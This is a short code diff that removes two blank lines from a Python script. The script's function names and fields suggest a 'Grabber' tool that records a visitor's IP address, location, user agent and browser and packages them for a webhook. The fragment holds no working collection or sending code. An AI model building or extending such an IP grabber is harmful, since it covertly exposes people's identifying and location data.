@@ -35,7 +35,6 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     }
   ],
 }
-
 def prev(ip,uag):
   return {
   "username": "Grabber",
@@ -53,7 +52,6 @@ def prev(ip,uag):
     }
   ],
 }
-
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         s = self.path
